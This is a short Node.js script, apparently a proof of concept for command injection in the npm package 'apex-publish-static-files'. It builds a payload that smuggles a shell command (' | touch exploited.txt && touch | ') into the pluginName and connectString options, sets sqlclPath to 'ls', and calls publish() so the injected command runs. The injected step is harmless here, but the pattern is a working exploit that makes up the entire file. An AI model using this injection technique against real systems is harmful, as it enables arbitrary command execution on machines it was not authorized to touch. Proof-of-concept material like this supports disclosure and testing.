const pkg = require('apex-publish-static-files');

const payload = " | touch exploited.txt && touch | ";

console.log(pkg);


const opts = {
    sqlclPath: 'ls',
    pluginName: payload,
    connectString: payload,
    directory: process.cwd(),
    appID: "",
}

pkg.publish(opts);